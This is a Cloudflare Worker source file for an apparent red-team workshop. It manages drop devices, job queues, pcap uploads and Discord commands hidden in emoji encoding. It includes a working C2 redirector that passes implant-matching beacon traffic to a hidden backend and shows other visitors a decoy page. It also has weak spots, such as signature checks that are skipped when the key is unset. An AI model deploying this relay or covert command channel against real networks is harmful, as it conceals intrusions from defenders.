/**
 * fleet-gateway Worker — Labs 07-14 (complete)
 *
 * Endpoint status:
 *   /v1/health                  — IMPLEMENTED (Lab 07)
 *   /v1/devices/enroll          — IMPLEMENTED (Lab 09 — D1 INSERT)
 *   /v1/devices                 — IMPLEMENTED (Lab 09 — D1 SELECT)
 *   /v1/commands/<device>       — IMPLEMENTED (Lab 10 — KV enqueue)
 *   /v1/jobs/<id>               — IMPLEMENTED (Lab 10 — KV read)
 *   /v1/jobs/<id>/complete      — IMPLEMENTED (Lab 14 — Mango exec report)
 *   /v1/artifacts/upload        — IMPLEMENTED (Lab 10 — R2 signed PUT URL)
 *   /v1/artifacts/<id>          — IMPLEMENTED (Lab 10 — R2 signed GET URL)
 *   /v1/chatops/discord         — IMPLEMENTED (Lab 11 — EmojiChef decode)
 *   /relay/*                    — IMPLEMENTED (Lab 13 — malleable C2 profile relay)
 *
 * Required bindings (wrangler.toml / secrets):
 *   FLEET_DB            — D1 database "fleet-database" (Lab 09)
 *   RATE_LIMITS         — KV namespace (Lab 10) — also stores relay_profile, relay_decoy_html
 *   ARTIFACTS           — R2 bucket "artifacts-bucket" (Lab 10)
 *   DISCORD_PUBLIC_KEY  — secret: Discord app Ed25519 public key (Lab 11)
 *   DISCORD_WEBHOOK_URL — secret: Discord webhook URL for Lab 14 pcap delivery
 *   RELAY_BACKEND       — var or secret: https://app.YOUR_DOMAIN (Lab 13 backend hostname)
 *
 * Lab 14 dispatch model (important):
 *   Workers cannot initiate Tailscale connections. The operator (in devcontainer)
 *   bridges the Worker and the Mango:
 *     1. Operator reads queued "capture" job from GET /v1/jobs/<id>
 *     2. Operator runs: tailscale ssh root@drop-<student> 'sh /tmp/run-capture.sh <id> 30'
 *     3. Mango runs tcpdump-mini, uploads pcap via POST /v1/artifacts/upload (signed PUT URL)
 *     4. Mango calls PATCH /v1/jobs/<id>/complete with { artifact_id, device_id, duration_s }
 *     5. Worker mints signed GET URL, posts to Discord webhook, logs to D1 audit_log
 */

// ---------------------------------------------------------------------------
// EmojiChef Quick Recipe decoder/encoder
// Source: docs/technical_specifications.md
// Base: 0x1F345 (🍅), max: 0x1F384 (🎄), 6 bits per emoji.
//
// The codepoint range covers exactly 64 emoji (offsets 0..63), one for
// every possible 6-bit chunk value. This makes encode/decode total
// over the 6-bit alphabet: any byte sequence produces only in-range
// emoji on encode, and the decoder accepts any combination without
// throwing. The range extends past the food block at U+1F37F (popcorn)
// into the celebration block at U+1F380..U+1F384 (🎀 ribbon, 🎁 wrapped
// gift, 🎂 birthday cake, 🎃 jack-o-lantern, 🎄 christmas tree).
//
// Round-trip is lossless for any ASCII string. encode() pads the input
// to the next multiple of 3 bytes with NUL (0x00) so the bit count is
// divisible by both 8 (byte boundary) and 6 (emoji boundary); decode()
// strips trailing NUL pad bytes. Length-mod-3 inputs need no padding
// and produce byte-identical encodings to the pre-padding implementation.
//
// Test vectors (verified 2026-05-06; full set in
// labs/lab11-chatops-emojichef/test-vectors.txt):
//   🍗🍊🍒🍈                  → "HSC"     (3 ch, 4 emoji, no pad)
//   🍡🍼🍖🍦🍢🍌🍚🍸          → "status"  (6 ch, 8 emoji, no pad)
//   🍡🍫🍚🍧🍠🍻🎂🍹          → "reboot"  (6 ch, 8 emoji, no pad; uses extended-range 🎂)
//   🍝🍻🍊🍵🍢🍌🍚🍷🍞🍕🍅🍅  → "capture" (7 ch, 12 emoji, 2 NUL pad)
//   🍠🍋🍪🍸🍢🍅🍅🍅          → "list"    (4 ch, 8 emoji, 2 NUL pad)
// ---------------------------------------------------------------------------
class EmojiChefQuick {
    constructor() {
        this.base = 0x1F345;     // 🍅
        this.maxEmoji = 0x1F384; // 🎄 (extended past 🍿 to cover 6-bit values 0..63)
        this.bitsPerEmoji = 6;
    }

    decode(emojiString) {
        if (!emojiString || typeof emojiString !== 'string') {
            throw new Error('EmojiChef: invalid input — expected a non-empty string');
        }

        const codePoints = [...emojiString].map(emoji => {
            const cp = emoji.codePointAt(0);
            if (cp < this.base || cp > this.maxEmoji) {
                throw new Error(`EmojiChef: out-of-range emoji U+${cp.toString(16).toUpperCase()}`);
            }
            return cp - this.base;
        });

        // 6-bit values → binary string
        const binaryString = codePoints
            .map(v => v.toString(2).padStart(this.bitsPerEmoji, '0'))
            .join('');

        // Binary → ASCII bytes (drop trailing incomplete byte)
        const result = [];
        for (let i = 0; i + 8 <= binaryString.length; i += 8) {
            result.push(String.fromCharCode(parseInt(binaryString.substr(i, 8), 2)));
        }
        // Strip trailing NUL pad bytes added by encode() to make the
        // input length a multiple of 3.
        return result.join('').replace(/\0+$/, '');
    }

    encode(text) {
        if (!text || typeof text !== 'string') {
            throw new Error('EmojiChef: invalid input — expected a non-empty string');
        }

        // Pad to the next multiple of 3 bytes with NUL so the bit count
        // is divisible by both 8 (byte boundary) and 6 (emoji boundary).
        const padLen = (3 - (text.length % 3)) % 3;
        const padded = text + '\0'.repeat(padLen);

        const binaryString = [...padded]
            .map(c => c.charCodeAt(0).toString(2).padStart(8, '0'))
            .join('');

        const result = [];
        for (let i = 0; i + this.bitsPerEmoji <= binaryString.length; i += this.bitsPerEmoji) {
            const value = parseInt(binaryString.substr(i, this.bitsPerEmoji), 2);
            result.push(String.fromCodePoint(this.base + value));
        }
        return result.join('');
    }
}

// ---------------------------------------------------------------------------
// CORS headers — applied to every non-OPTIONS response
// ---------------------------------------------------------------------------
const CORS_HEADERS = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': [
        'Content-Type',
        'Authorization',
        'CF-Access-Client-Id',
        'CF-Access-Client-Secret',
        'X-Signature-Ed25519',
        'X-Signature-Timestamp',
    ].join(', '),
};

export default {
    async fetch(request, env, ctx) {
        // CORS preflight
        if (request.method === 'OPTIONS') {
            return new Response(null, { status: 204, headers: CORS_HEADERS });
        }

        const url = new URL(request.url);
        const response = await handleRequest(url, request, env);

        // Attach CORS headers to every response
        const mutable = new Response(response.body, response);
        for (const [key, value] of Object.entries(CORS_HEADERS)) {
            mutable.headers.set(key, value);
        }
        return mutable;
    },
};

/**
 * Route dispatcher.
 * Prefer exact matches first, then prefix matches in order of specificity.
 * Lab 13 adds: pathname.startsWith('/relay/')
 */
async function handleRequest(url, request, env) {
    const { pathname } = url;

    // Exact matches
    switch (pathname) {
        case '/v1/health':
            return handleHealth(env);

        case '/v1/devices/enroll':
            return handleEnroll(request, env);

        case '/v1/devices':
            return handleDeviceList(request, env);

        case '/v1/chatops/discord':
            return handleDiscordChatops(request, env);

        case '/v1/artifacts/upload':
            return handleArtifactUpload(request, env);
    }

    // Prefix matches — order matters; most specific first.
    if (pathname.startsWith('/v1/commands/')) {
        return handleCommand(pathname, request, env);
    }
    // Lab 14: job completion report from Mango (PATCH /v1/jobs/<id>/complete).
    // MUST be checked before the generic /v1/jobs/ status route below.
    if (pathname.startsWith('/v1/jobs/') && pathname.endsWith('/complete')) {
        return handleJobCompletion(pathname, request, env);
    }
    if (pathname.startsWith('/v1/jobs/')) {
        return handleJobStatus(pathname, request, env);
    }
    // Two-step upload (Worker-proxy mode):
    //   - POST /v1/artifacts/upload     → handleArtifactUpload (mints id + url)
    //   - PUT  /v1/artifacts/<id>/data  → handleArtifactPut    (stores bytes)
    //   - GET  /v1/artifacts/<id>       → handleArtifactGet    (returns metadata + url)
    //   - GET  /v1/artifacts/<id>/data  → handleArtifactGet    (streams bytes)
    if (pathname.startsWith('/v1/artifacts/') && pathname.endsWith('/data') && request.method === 'PUT') {
        return handleArtifactPut(pathname, request, env);
    }
    if (pathname.startsWith('/v1/artifacts/')) {
        return handleArtifactGet(pathname, request, env);
    }
    // Lab 13: malleable C2 profile redirector
    if (pathname.startsWith('/relay/')) {
        return handleRelay(pathname, request, env);
    }

    return new Response('Not Found', { status: 404 });
}

// ---------------------------------------------------------------------------
// /v1/health — IMPLEMENTED (Lab 07)
// ---------------------------------------------------------------------------
async function handleHealth(env) {
    return Response.json({
        ok: true,
        version: (env && env.WORKER_VERSION) ? env.WORKER_VERSION : '1.0.0',
        timestamp: new Date().toISOString(),
    });
}

// ---------------------------------------------------------------------------
// /v1/devices/enroll — IMPLEMENTED (Lab 09)
// POST with CF-Access-Client-Id + CF-Access-Client-Secret headers.
// Body: { device_id, device_type, tailscale_hostname, metadata? }
// Returns: { enrolled: true, tag, device_id, tailscale_hostname }
// ---------------------------------------------------------------------------
async function handleEnroll(request, env) {
    if (request.method !== 'POST') {
        return new Response('Method Not Allowed', { status: 405 });
    }

    // CF Access strips the raw CF-Access-Client-Id / CF-Access-Client-Secret
    // headers after validating the service token; what reaches the Worker is
    // the Cf-Access-Jwt-Assertion header (signed by CF Access) and an
    // Cf-Access-Authenticated-User-Email header for browser-flow operators.
    // Presence of either is sufficient evidence that CF Access let the
    // request through.  Lab 14 / Lab 11 handlers use the same pattern.
    const accessJwt = request.headers.get('Cf-Access-Jwt-Assertion');
    const accessEmail = request.headers.get('Cf-Access-Authenticated-User-Email');

    if (!accessJwt && !accessEmail) {
        return Response.json(
            { error: 'Missing CF Access JWT — request did not authenticate via CF Access' },
            { status: 401 }
        );
    }

    let body;
    try {
        body = await request.json();
    } catch {
        return Response.json({ error: 'Invalid JSON body' }, { status: 400 });
    }

    const { device_id, device_type, tailscale_hostname, metadata = {} } = body;

    if (!device_id || !device_type || !tailscale_hostname) {
        return Response.json(
            { error: 'Missing required fields: device_id, device_type, tailscale_hostname' },
            { status: 400 }
        );
    }

    // Stable tag for Tailscale ACL scoping
    const tag = `device-${device_type}-${Date.now()}`;

    try {
        // Upsert device — last-write-wins on re-enrollment (e.g. power-cycle)
        await env.FLEET_DB.prepare(`
            INSERT INTO devices
                (device_id, device_type, tag, tailscale_hostname, engagement_id, metadata, enrolled_at, last_seen)
            VALUES (?1, ?2, ?3, ?4, ?5, ?6, datetime('now'), datetime('now'))
            ON CONFLICT(device_id) DO UPDATE SET
                device_type        = excluded.device_type,
                tag                = excluded.tag,
                tailscale_hostname = excluded.tailscale_hostname,
                metadata           = excluded.metadata,
                last_seen          = datetime('now')
        `).bind(
            device_id,
            device_type,
            tag,
            tailscale_hostname,
            'workshop',
            JSON.stringify(metadata)
        ).run();

        // Audit. After the CF-Access-Client-Id refactor we identify the caller
        // by the Access email (operator browser flow) or the JWT subject
        // (service-token flow); log whichever the request actually carries.
        const operatorId = accessEmail
            || (accessJwt ? `jwt:${accessJwt.slice(0, 16)}...` : 'unknown');
        await logAudit(env, {
            operator_id: operatorId,
            device_id,
            action: 'enroll',
            details: { device_type, tailscale_hostname, tag },
            source_ip: request.headers.get('CF-Connecting-IP'),
            user_agent: request.headers.get('User-Agent'),
        });

        return Response.json({ enrolled: true, tag, device_id, tailscale_hostname });

    } catch (err) {
        console.error('handleEnroll error:', err);
        return Response.json({ error: 'Enrollment failed', detail: err.message }, { status: 500 });
    }
}

// ---------------------------------------------------------------------------
// /v1/devices — IMPLEMENTED (Lab 09)
// GET — requires CF-Access-Jwt-Assertion (operator JWT from CF Access).
// Returns array of device rows with parsed metadata and online status.
// ---------------------------------------------------------------------------
async function handleDeviceList(request, env) {
    if (request.method !== 'GET') {
        return new Response('Method Not Allowed', { status: 405 });
    }

    const jwtHeader = request.headers.get('CF-Access-Jwt-Assertion');
    if (!jwtHeader) {
        return Response.json({ error: 'Unauthorized — CF Access JWT required' }, { status: 401 });
    }

    try {
        const result = await env.FLEET_DB.prepare(`
            SELECT device_id, device_type, tag, tailscale_hostname,
                   enrolled_at, last_seen, metadata
            FROM devices
            ORDER BY last_seen DESC
        `).all();

        const devices = result.results.map(row => ({
            ...row,
            metadata: safeJsonParse(row.metadata, {}),
            status: isDeviceOnline(row.last_seen) ? 'online' : 'offline',
        }));

        return Response.json(devices);

    } catch (err) {
        console.error('handleDeviceList error:', err);
        return Response.json({ error: 'Failed to fetch devices', detail: err.message }, { status: 500 });
    }
}

// ---------------------------------------------------------------------------
// /v1/commands/<device_id> — IMPLEMENTED (Lab 10)
// POST — enqueue a job in KV under key job:<uuid>.
// Body: { command, params?, timeout? }
// Returns: { job_id, status: "queued", device_id }
// ---------------------------------------------------------------------------
async function handleCommand(pathname, request, env) {
    if (request.method !== 'POST') {
        return new Response('Method Not Allowed', { status: 405 });
    }

    const deviceId = pathname.split('/')[3];
    if (!deviceId) {
        return Response.json({ error: 'Missing device ID in path' }, { status: 400 });
    }

    let body;
    try {
        body = await request.json();
    } catch {
        return Response.json({ error: 'Invalid JSON body' }, { status: 400 });
    }

    const { command, params = {}, timeout = 30 } = body;
    if (!command) {
        return Response.json({ error: 'Missing required field: command' }, { status: 400 });
    }

    try {
        const jobId = crypto.randomUUID();
        await enqueueJob(env, jobId, {
            device_id: deviceId,
            command,
            params,
            timeout,
        });

        // Audit the dispatch
        const operatorId = request.headers.get('CF-Access-Client-Id') ||
                           request.headers.get('CF-Access-Jwt-Assertion') ||
                           'unknown';
        await logAudit(env, {
            operator_id: operatorId,
            device_id: deviceId,
            action: 'command_dispatch',
            details: { job_id: jobId, command, params },
            source_ip: request.headers.get('CF-Connecting-IP'),
            user_agent: request.headers.get('User-Agent'),
        });

        return Response.json({ job_id: jobId, status: 'queued', device_id: deviceId });

    } catch (err) {
        console.error('handleCommand error:', err);
        return Response.json({ error: 'Command enqueue failed', detail: err.message }, { status: 500 });
    }
}

// ---------------------------------------------------------------------------
// /v1/jobs/<job_id> — IMPLEMENTED (Lab 10)
// GET — read job state from KV.
// Returns the full job object or 404 if expired / never existed.
// ---------------------------------------------------------------------------
async function handleJobStatus(pathname, request, env) {
    if (request.method !== 'GET') {
        return new Response('Method Not Allowed', { status: 405 });
    }

    const jobId = pathname.split('/')[3];
    if (!jobId) {
        return Response.json({ error: 'Missing job ID in path' }, { status: 400 });
    }

    try {
        const value = await env.RATE_LIMITS.get(`job:${jobId}`);
        if (value === null) {
            return Response.json({ error: 'Job not found or expired' }, { status: 404 });
        }
        return Response.json(safeJsonParse(value, { raw: value }));
    } catch (err) {
        console.error('handleJobStatus error:', err);
        return Response.json({ error: 'Failed to fetch job', detail: err.message }, { status: 500 });
    }
}

// ---------------------------------------------------------------------------
// /v1/artifacts/upload — IMPLEMENTED (Lab 10)
//
// In-class path (Worker-proxy mode):
//   - Two-step: client first POSTs metadata-only to mint an artifact_id +
//     upload_url that points back at the Worker.  Client then PUTs the bytes
//     to upload_url.  Worker streams the body straight into R2.
//   - The body PUT is auth-gated by the same CF Access policy as the rest of
//     /v1/* (no separate signature scheme to manage).
//
// Why not signed URLs against R2 directly?
//   - The R2 binding does not expose `createPresignedUrl()` despite older
//     workshop code claiming it does.  Real signed URLs require AWS S3v4
//     against R2's S3-compatible endpoint with an R2 access-key + secret as
//     Worker secrets — that is per-deploy dashboard work that the in-class
//     path avoids.  See the take-home variant in `instructor/dns_delegation_setup_guide.md`-
//     style notes for the SigV4 + aws4fetch implementation.
//
// Body for POST /v1/artifacts/upload (metadata only; no bytes):
//   { artifact_id?: string, content_type?: string }
//
// Returns:
//   { artifact_id, upload_url: "https://api.<host>/v1/artifacts/<id>/data",
//     expires_in, content_type }
//
// PUT /v1/artifacts/<id>/data accepts the bytes and writes them to R2.
// ---------------------------------------------------------------------------
async function handleArtifactUpload(request, env) {
    if (request.method !== 'POST') {
        return new Response('Method Not Allowed', { status: 405 });
    }

    let body = {};
    try {
        body = await request.json();
    } catch { /* body is optional */ }

    const artifactId = body.artifact_id || crypto.randomUUID();
    const contentType = body.content_type || 'application/octet-stream';
    const expiresIn = 900; // 15 minutes — informational; the upload endpoint is auth-gated, not URL-signed

    // Build the upload URL by reflecting the request's own host.  This way the
    // worker doesn't need to know its public hostname (which differs per slot).
    const url = new URL(request.url);
    const uploadUrl = `${url.protocol}//${url.host}/v1/artifacts/${artifactId}/data`;

    return Response.json({
        artifact_id: artifactId,
        upload_url: uploadUrl,
        expires_in: expiresIn,
        content_type: contentType,
    });
}

// PUT /v1/artifacts/<id>/data — the second step of the upload flow.  Streams
// the body into R2 under the artifact_id key.
async function handleArtifactPut(pathname, request, env) {
    if (request.method !== 'PUT') {
        return new Response('Method Not Allowed', { status: 405 });
    }

    const artifactId = pathname.replace(/^\/v1\/artifacts\//, '').replace(/\/data$/, '');
    if (!artifactId) {
        return Response.json({ error: 'Missing artifact ID in path' }, { status: 400 });
    }

    const contentType = request.headers.get('Content-Type') || 'application/octet-stream';

    try {
        await env.ARTIFACTS.put(artifactId, request.body, {
            httpMetadata: { contentType },
        });
        return Response.json({ artifact_id: artifactId, stored: true });
    } catch (err) {
        console.error('handleArtifactPut error:', err);
        return Response.json({ error: 'R2 put failed', detail: err.message }, { status: 500 });
    }
}

// ---------------------------------------------------------------------------
// /v1/artifacts/<artifact_id> — IMPLEMENTED (Lab 10)
//
// In-class path (Worker-proxy mode):
//   GET returns metadata + a download_url that points back at the Worker's
//   own /data sub-path.  Following the download_url streams the R2 bytes
//   through the Worker.  Auth-gated by CF Access (same as upload).
//
// Returns:
//   { artifact_id, download_url, expires_in, size, content_type }
//
// Lab 14 (capstone) takes this download_url and posts it back via the
// configured ChatOps channel.
// ---------------------------------------------------------------------------
async function handleArtifactGet(pathname, request, env) {
    if (request.method !== 'GET') {
        return new Response('Method Not Allowed', { status: 405 });
    }

    const artifactId = pathname.replace(/^\/v1\/artifacts\//, '');
    if (!artifactId) {
        return Response.json({ error: 'Missing artifact ID in path' }, { status: 400 });
    }

    // /v1/artifacts/<id>/data — stream the bytes back directly.
    if (artifactId.endsWith('/data')) {
        const realId = artifactId.replace(/\/data$/, '');
        const obj = await env.ARTIFACTS.get(realId);
        if (!obj) {
            return Response.json({ error: 'Artifact not found' }, { status: 404 });
        }
        return new Response(obj.body, {
            headers: {
                'Content-Type': obj.httpMetadata?.contentType || 'application/octet-stream',
                'Content-Length': String(obj.size),
            },
        });
    }

    // /v1/artifacts/<id> — return metadata + a download_url that points at /data.
    const expiresIn = 3600; // 1 hour — informational; gating is via CF Access, not URL signature

    try {
        const head = await env.ARTIFACTS.head(artifactId);
        if (!head) {
            return Response.json({ error: 'Artifact not found' }, { status: 404 });
        }

        const url = new URL(request.url);
        const downloadUrl = `${url.protocol}//${url.host}/v1/artifacts/${artifactId}/data`;

        return Response.json({
            artifact_id: artifactId,
            download_url: downloadUrl,
            expires_in: expiresIn,
            size: head.size,
            content_type: head.httpMetadata?.contentType || 'application/octet-stream',
        });
    } catch (err) {
        console.error('handleArtifactGet error:', err);
        return Response.json({ error: 'Failed to fetch artifact metadata', detail: err.message }, { status: 500 });
    }
}

// ---------------------------------------------------------------------------
// /v1/chatops/discord — IMPLEMENTED (Lab 11)
// POST — receive a Discord interaction/webhook payload, verify the Ed25519
// signature, decode the EmojiChef-encoded command, and enqueue it as a job.
//
// Discord sends an Ed25519 signature via headers:
//   X-Signature-Ed25519   — hex-encoded signature
//   X-Signature-Timestamp — Unix timestamp string (prepended to body for sig check)
//
// The DISCORD_PUBLIC_KEY env var must be set in wrangler.toml [vars] or as a
// Cloudflare secret (wrangler secret put DISCORD_PUBLIC_KEY).
//
// Payload from Discord webhook (outbound webhook / interactions endpoint):
//   { content: "<emoji string>", channel_id?, author? }
//   OR Discord interactions JSON with { data.options[0].value } containing emojis
//
// After decoding, the command name (first whitespace-delimited token) is matched
// against the known vocabulary.  Unknown commands are rejected with 422.
//
// Returns: { decoded, command, job_id, status }
// ---------------------------------------------------------------------------
const COMMAND_VOCABULARY = new Set([
    'status', 'reboot', 'capture', 'list', 'ping', 'exec', 'fetch', 'HSC',
]);

async function handleDiscordChatops(request, env) {
    if (request.method !== 'POST') {
        return new Response('Method Not Allowed', { status: 405 });
    }

    // --- Signature verification ---
    const signature = request.headers.get('X-Signature-Ed25519');
    const timestamp  = request.headers.get('X-Signature-Timestamp');

    if (!signature || !timestamp) {
        return Response.json({ error: 'Missing Discord signature headers' }, { status: 401 });
    }

    const rawBody = await request.text();

    if (env.DISCORD_PUBLIC_KEY) {
        const valid = await verifyDiscordSignature(
            env.DISCORD_PUBLIC_KEY,
            signature,
            timestamp,
            rawBody
        );
        if (!valid) {
            return Response.json({ error: 'Invalid request signature' }, { status: 401 });
        }
    }
    // If DISCORD_PUBLIC_KEY is not configured, verification is skipped (dev mode).
    // Set the secret before using in production.

    // --- Parse payload ---
    let payload;
    try {
        payload = JSON.parse(rawBody);
    } catch {
        return Response.json({ error: 'Invalid JSON body' }, { status: 400 });
    }

    // Discord sends a PING (type 1) to verify the endpoint; respond immediately
    if (payload.type === 1) {
        return Response.json({ type: 1 });
    }

    // Extract the emoji string — support both a direct { content } field and
    // Discord slash-command interactions { data.options[0].value }
    const emojiString =
        payload.content ||
        (payload.data?.options?.[0]?.value) ||
        null;

    if (!emojiString) {
        return Response.json({ error: 'No emoji content found in payload' }, { status: 400 });
    }

    // --- Decode ---
    const chef = new EmojiChefQuick();
    let decoded;
    try {
        decoded = chef.decode(emojiString.trim());
    } catch (err) {
        return Response.json({ error: `EmojiChef decode failed: ${err.message}` }, { status: 422 });
    }

    // --- Parse command + args ---
    const parts = decoded.trim().split(/\s+/);
    const commandName = parts[0];
    const commandArgs = parts.slice(1);

    if (!COMMAND_VOCABULARY.has(commandName)) {
        return Response.json(
            { error: `Unknown command: "${commandName}"`, decoded, known: [...COMMAND_VOCABULARY] },
            { status: 422 }
        );
    }

    // --- Enqueue ---
    // Use a synthetic device_id from the payload if present; otherwise target
    // the "broadcast" channel — Lab 12/13 will select the appropriate device.
    const deviceId = payload.device_id || payload.channel_id || 'broadcast';
    const jobId = crypto.randomUUID();
    await enqueueJob(env, jobId, {
        device_id: deviceId,
        command: commandName,
        params: { args: commandArgs, raw: decoded },
        timeout: 60,
        source: 'discord_chatops',
        author: payload.author?.username || payload.member?.user?.username || 'unknown',
    });

    // Audit
    await logAudit(env, {
        operator_id: payload.author?.id || payload.member?.user?.id || 'discord',
        device_id: deviceId !== 'broadcast' ? deviceId : null,
        action: 'chatops_dispatch',
        details: { emoji: emojiString, decoded, command: commandName, job_id: jobId },
        source_ip: request.headers.get('CF-Connecting-IP'),
        user_agent: request.headers.get('User-Agent'),
    });

    return Response.json({
        decoded,
        command: commandName,
        args: commandArgs,
        job_id: jobId,
        status: 'queued',
        device_id: deviceId,
    });
}

// ---------------------------------------------------------------------------
// Utility: verify Discord Ed25519 signature using Web Crypto API
// ---------------------------------------------------------------------------
async function verifyDiscordSignature(publicKeyHex, signatureHex, timestamp, body) {
    try {
        const encoder = new TextEncoder();
        const publicKeyBytes = hexToBytes(publicKeyHex);
        const signatureBytes = hexToBytes(signatureHex);
        const message = encoder.encode(timestamp + body);

        const cryptoKey = await crypto.subtle.importKey(
            'raw',
            publicKeyBytes,
            { name: 'Ed25519', namedCurve: 'Ed25519' },
            false,
            ['verify']
        );

        return await crypto.subtle.verify('Ed25519', cryptoKey, signatureBytes, message);
    } catch {
        return false;
    }
}

// ---------------------------------------------------------------------------
// Utility: enqueue a job in KV under key job:<job_id>
// Shared by handleCommand() and handleDiscordChatops() so both callers produce
// identically shaped job objects that handleJobStatus() can read.
// TTL = timeout + 300s (5-min grace) to allow status polling after completion.
// ---------------------------------------------------------------------------
async function enqueueJob(env, jobId, opts) {
    const { device_id, command, params = {}, timeout = 30, ...rest } = opts;
    const ttl = timeout + 300;

    await env.RATE_LIMITS.put(
        `job:${jobId}`,
        JSON.stringify({
            job_id: jobId,
            device_id,
            command,
            params,
            status: 'queued',
            created_at: new Date().toISOString(),
            timeout,
            ...rest,
        }),
        { expirationTtl: ttl }
    );
}

// ---------------------------------------------------------------------------
// Utility: append a row to audit_log
// device_id and source_ip are nullable.
// ---------------------------------------------------------------------------
async function logAudit(env, entry) {
    if (!env.FLEET_DB) return; // Guard: D1 not bound (Lab 07 / local dev)
    try {
        await env.FLEET_DB.prepare(`
            INSERT INTO audit_log
                (operator_id, device_id, action, details, source_ip, user_agent)
            VALUES (?1, ?2, ?3, ?4, ?5, ?6)
        `).bind(
            entry.operator_id || null,
            entry.device_id   || null,
            entry.action,
            JSON.stringify(entry.details || {}),
            entry.source_ip   || null,
            entry.user_agent  || null
        ).run();
    } catch (err) {
        // Audit failure must not break the primary request path
        console.error('logAudit error (non-fatal):', err);
    }
}

// ---------------------------------------------------------------------------
// Utility: determine whether a device is "online" based on last_seen timestamp
// ---------------------------------------------------------------------------
function isDeviceOnline(lastSeen) {
    if (!lastSeen) return false;
    const diffMs = Date.now() - new Date(lastSeen).getTime();
    return diffMs < 5 * 60 * 1000; // 5 minutes
}

// ---------------------------------------------------------------------------
// Utility: safe JSON.parse with fallback
// ---------------------------------------------------------------------------
function safeJsonParse(str, fallback) {
    try { return JSON.parse(str); }
    catch { return fallback; }
}

// ---------------------------------------------------------------------------
// Utility: hex string → Uint8Array
// ---------------------------------------------------------------------------
function hexToBytes(hex) {
    const bytes = new Uint8Array(hex.length / 2);
    for (let i = 0; i < hex.length; i += 2) {
        bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
    }
    return bytes;
}

// ===========================================================================
// Lab 13 — /relay/* — malleable C2 profile redirector
// ===========================================================================
//
// Profile is stored in KV (RATE_LIMITS binding) under key "relay_profile".
// Shape:
//   {
//     "user_agent_pattern": "<substring>",
//     "required_header": { "name": "<name>", "value": "<value>" },
//     "allowed_paths": ["/relay/update", ...],
//     "backend": "https://app.YOUR_DOMAIN",
//     "decoy_status": 200,
//     "log_ua_bytes": 32
//   }
//
// Decoy HTML is stored in KV under key "relay_decoy_html".
//
// Decision logic:
//   1. Path in allowed_paths  AND
//   2. User-Agent contains user_agent_pattern  AND
//   3. Required header name+value present
//   → proxy request to backend
//   Otherwise → return decoy HTML with status 200
//
// All decisions are logged to D1 audit_log with action="relay_decision".
// ---------------------------------------------------------------------------

async function handleRelay(pathname, request, env) {
    // Load profile from KV (10ms cold hit; warm ~0.5ms)
    let profile = null;
    if (env.RATE_LIMITS) {
        try {
            const raw = await env.RATE_LIMITS.get('relay_profile');
            if (raw) profile = safeJsonParse(raw, null);
        } catch (err) {
            console.error('handleRelay: failed to load relay_profile from KV:', err);
        }
    }

    // Hardcoded workshop fallback — matches profile.example.json defaults.
    // Replace with a real KV entry in production.
    if (!profile) {
        profile = {
            user_agent_pattern: 'EPL-Implant/1.0',
            required_header: { name: 'X-EPL-Profile', value: 'epl-relay-alpha-2024' },
            allowed_paths: ['/relay/update', '/relay/stage', '/relay/beacon', '/relay/data'],
            backend: env.RELAY_BACKEND || '',
            decoy_status: 200,
            log_ua_bytes: 32,
        };
    }

    const ua = request.headers.get('User-Agent') || '';
    const uaFingerprint = ua.substring(0, profile.log_ua_bytes || 32);
    const reqHeaderValue = request.headers.get(profile.required_header.name) || '';

    // Evaluate all three match conditions
    const pathMatch = (profile.allowed_paths || []).some(p => pathname.startsWith(p));
    const uaMatch   = profile.user_agent_pattern
        ? ua.includes(profile.user_agent_pattern)
        : true;
    const headerMatch =
        reqHeaderValue === profile.required_header.value;

    const isValid = pathMatch && uaMatch && headerMatch;

    // Log the decision to D1
    await logAudit(env, {
        operator_id: null,
        device_id:   null,
        action:      'relay_decision',
        details: {
            result:  isValid ? 'proxy' : 'decoy',
            path:    pathname,
            ua:      uaFingerprint,
            path_match:   pathMatch,
            ua_match:     uaMatch,
            header_match: headerMatch,
        },
        source_ip:  request.headers.get('CF-Connecting-IP'),
        user_agent: uaFingerprint,
    });

    if (isValid && profile.backend) {
        // Proxy to backend — forward method, headers, and body as-is.
        // Strip CF-internal headers to avoid leaking operator infrastructure.
        const backendUrl = profile.backend.replace(/\/$/, '') + pathname + (new URL(request.url).search);
        const proxyHeaders = new Headers(request.headers);
        proxyHeaders.delete('CF-Access-Client-Id');
        proxyHeaders.delete('CF-Access-Client-Secret');
        proxyHeaders.delete('CF-Access-Jwt-Assertion');

        let backendResponse;
        try {
            backendResponse = await fetch(backendUrl, {
                method:  request.method,
                headers: proxyHeaders,
                body:    request.method !== 'GET' && request.method !== 'HEAD'
                    ? request.body
                    : undefined,
            });
        } catch (err) {
            console.error('handleRelay: backend fetch failed:', err);
            // Backend is unreachable — serve decoy rather than expose error
            return serveDecoy(env, profile);
        }

        // Add a debug header so workshop students can confirm the proxy path
        const relayedResponse = new Response(backendResponse.body, backendResponse);
        relayedResponse.headers.set('X-Relay-Backend', 'proxied');
        return relayedResponse;
    }

    // Invalid profile or no backend configured — serve decoy
    return serveDecoy(env, profile);
}

/**
 * Build and return the decoy HTML response.
 * Content is loaded from KV key "relay_decoy_html"; falls back to an inline stub.
 */
async function serveDecoy(env, profile) {
    let html = '';
    if (env.RATE_LIMITS) {
        try {
            html = await env.RATE_LIMITS.get('relay_decoy_html') || '';
        } catch { /* silent fallback */ }
    }
    if (!html) {
        html = '<!DOCTYPE html><html><body><h1>Network Operations Portal</h1>' +
               '<p>This service is in maintenance mode.</p></body></html>';
    }
    return new Response(html, {
        status: profile?.decoy_status ?? 200,
        headers: { 'Content-Type': 'text/html; charset=utf-8' },
    });
}

// ===========================================================================
// Lab 14 — PATCH /v1/jobs/<id>/complete — Mango reports exec + upload done
// ===========================================================================
//
// The Mango (run-capture.sh) calls this endpoint after uploading the pcap to R2.
// Body: { artifact_id, device_id, exit_code?, duration_s? }
//
// The Worker:
//   1. Updates the KV job record to status="complete" with artifact_id.
//   2. Mints a signed R2 GET URL via handleArtifactGet() logic.
//   3. Posts the signed URL back to the Discord webhook (DISCORD_WEBHOOK_URL env var).
//   4. Logs the full chain in D1 audit_log.
//
// IMPORTANT: The Worker cannot initiate Tailscale connections (Workers are
// stateless edge functions; no persistent network state, no Tailscale daemon).
// The dispatch model for Lab 14 is:
//   - Operator reads the queued job from /v1/jobs/<id> (or /v1/commands/<device>)
//   - Operator (in devcontainer) runs:
